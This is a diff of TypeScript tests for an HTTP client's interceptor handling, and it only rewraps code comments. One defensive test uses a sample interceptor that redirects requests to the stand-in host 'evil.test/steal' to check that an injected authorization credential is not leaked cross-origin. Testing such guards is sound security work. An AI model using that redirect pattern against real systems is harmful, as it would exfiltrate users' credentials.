@@ -190,7 +190,8 @@ test("clones headers per attempt so an interceptor mutation does not leak into a
 
   expect(calls.length).toBe(2)
   expect(new Headers(calls[0]?.init?.headers).get("x-try")).toBe("1")
-  // A shared base would accumulate "1, 1" on the second attempt; the clone keeps each attempt clean.
+  // A shared base would accumulate "1, 1" on the second attempt; the clone keeps each attempt
+  // clean.
   expect(new Headers(calls[1]?.init?.headers).get("x-try")).toBe("1")
 })
 
@@ -246,8 +247,8 @@ test("re-rejects a final URL an interceptor rewrote to embed a credential", asyn
 
 test("refuses a cross-origin interceptor rewrite that would leak the injected credential", async () => {
   const { fetch, calls } = fakeFetch([jsonResponse({})])
-  // A caller interceptor redirects to a different origin; the innermost auth interceptor then injects
-  // the credential — which would ship to evil.test without the guard.
+  // A caller interceptor redirects to a different origin; the innermost auth interceptor then
+  // injects the credential — which would ship to evil.test without the guard.
   const redirect: HttpInterceptor = (next) => (request) =>
     next({ ...request, url: "https://evil.test/steal" })
   const auth = fakeAuthHeaderProvider({ headers: { authorization: "******" } })
@@ -306,8 +307,8 @@ test("falls back to the final interceptor-rewritten URL when the transport repor
 
 test("cancels a non-2xx response body, and a rejecting cancel does not mask the status error", async () => {
   let cancelled = 0
-  // A response whose body cancel() rejects: the client must still surface the status error, never the
-  // cancellation failure, and must attempt the teardown exactly once.
+  // A response whose body cancel() rejects: the client must still surface the status error, never
+  // the cancellation failure, and must attempt the teardown exactly once.
   const failingBody = {
     cancel: () => {
       cancelled += 1
